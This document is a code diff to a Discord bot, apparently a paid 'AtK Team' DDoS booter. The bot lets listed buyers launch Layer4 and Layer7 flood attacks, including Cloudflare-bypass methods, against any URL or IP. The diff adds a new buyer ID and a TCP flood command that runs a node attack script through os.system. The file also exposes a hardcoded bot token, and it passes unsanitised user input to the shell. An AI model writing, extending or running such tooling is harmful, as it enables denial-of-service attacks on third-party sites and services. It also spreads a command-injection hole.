@@ -14,9 +14,9 @@ from re import search
 import threading
 import psutil
 token = "MTExODE2OTMxNTU3Mzc4MDUzMA.GcVu_M.MZ1iJ79MokoYKz0irRC6q83Our22sQkPsRWP44"
-buyers = [1101027355696304128]
-admins = [1101027355696304128]
-ownerList = [1101027355696304128]
+buyers = [1101027355696304128, 1137003715656687656]
+admins = [1101027355696304128, 1137003715656687656]
+ownerList = [1101027355696304128, 1137003715656687656]
 
 prefix = "."
 intents = discord.Intents.all()
@@ -236,7 +236,7 @@ async def Methods(ctx):
 		await ctx.reply(embed=embedc)
 	else:
 		embet = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
-		embet.add_field(name="**Methods Layer4**", value="```\nTCP_KILL\n```")
+		embet.add_field(name="**Methods Layer4**", value="```\nTCP_KILL\nTCP\n```")
 		embet.add_field(name="**Methods Layer7**", value="```\nSLOW\nHYPER\nUAM\nUAM-BYPASS\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKETS\nIO-STRESSER\nCLOUDFLARE\nCF-BYPASS\nTCP_KILL\nCOFZ_TLS\nTLS_BYPASS\nHTTP_CONNECT\n```")
 		embet.set_footer(text=f"~>© Owner : CofZZ & Asep | All Methods Show")
 		
@@ -279,6 +279,7 @@ async def Commands(ctx):
 		embed.set_thumbnail(url="https://media2.giphy.com/media/F2U5dFf4LG1zYmnJS2/giphy.gif")
 		embed.add_field(name="**PROXY**", value="```.Proxy```")
 		embed.add_field(name="**TCP_KILL**", value="```.TCP_KILL [url/ip] [time] [port]```")
+		embed.add_field(name="**TCP**", value="```.TCP [ip] [port] [packet] [time]```")
 		embed.add_field(name="**SLOW**", value="```.SLOW [url] [time]```")
 		embed.add_field(name="**HYPER**", value="```.HYPER [url] [time]```")
 		embed.add_field(name="**UAM**", value="```.UAM [url] [thread] [time] [raw/proxy]```")
@@ -597,7 +598,7 @@ async def TCP_KILL(ctx, url, time, port):
 		
 		
 @bot.command()
-async def COFZ_TLS(ctx, url, time, rate, thread, prxy):
+async def COFZ_TLS(ctx, url, time, rate, thread, proxy):
 	if ctx.author.id not in buyers:
 		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
 		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
@@ -611,7 +612,7 @@ async def COFZ_TLS(ctx, url, time, rate, thread, prxy):
 		embed.add_field(name="**Time**", value=f"`{time}")
 		embed.add_field(name="**Rate**", value=f"`{rate}`")
 		embed.add_field(name="**Thread**", value=f"`{thread}`")
-		embed.add_field(name="**Proxy**", value=f"`{prxy}`")
+		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
 		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
 		rdma1 = random.choice(ma1)
 		embed.set_image(url=rdma1)
@@ -620,7 +621,7 @@ async def COFZ_TLS(ctx, url, time, rate, thread, prxy):
 		
 		await ctx.send(embed=embed)
 		
-		os.system(f"node COFZ-TLS.js {url} {time} {rate} {thread} {prxy}")
+		os.system(f"node COFZ-TLS.js {url} {time} {rate} {thread} {proxy}")
 		
 
 @bot.command()
@@ -650,7 +651,7 @@ async def TLS_BYPASS(ctx, url, time, rate, thread):
 		os.system(f"node TLS-BYPASS.js {url} {time} {rate} {thread}")
 
 @bot.command()
-async def HTTP_CONNECT(ctx, url, port, conct, thread, time):
+async def HTTP_CONNECT(ctx, url, port, connect, thread, time):
 	if ctx.author.id not in buyers:
 		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
 		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
@@ -673,9 +674,33 @@ async def HTTP_CONNECT(ctx, url, port, conct, thread, time):
 		
 		await ctx.send(embed=embed)
 		
-		os.system(f"node HTTP-CONNECTv2.js {url} {port} {conct} {thread} {time}")
+		os.system(f"node HTTP-CONNECTv2.js {url} {port} {connect} {thread} {time}")
 				
-	
+@bot.command()
+async def TCP(ctx, ip, port, packet, time):
+	if ctx.author.id not in buyers:
+		embedc = discord.Embed(title=" **AtK Team** ", color=0xfcb103)
+		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
+		embedc.set_footer(text=f"~>© Owner : CofZZ & Asep | Warning {ctx.author.name}")
+		await ctx.reply(embed=embedc)
+	else:
+		embed = discord.Embed(title=" **AtK Team** ", color=discord.Colour.random())
+		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
+		embed.add_field(name="**Target**", value=f"`{ip}`")
+		embed.add_field(name="**Methods**", value="`TCP`")
+		embed.add_field(name="**Port**", value=f"`{port}")
+		embed.add_field(name="**Packets**", value=f"`{packet}`")
+		embed.add_field(name="**Time**", value=f"`{time}`")
+		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
+		rdma1 = random.choice(ma1)
+		embed.set_image(url=rdma1)
+		embed.set_footer(text=f"~>© Owner : CofZZ & Asep | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
+		
+		
+		await ctx.send(embed=embed)
+		
+		os.system(f"node tcp.js {ip} {port} {packet} {time}")
+					
 	
 	
 	
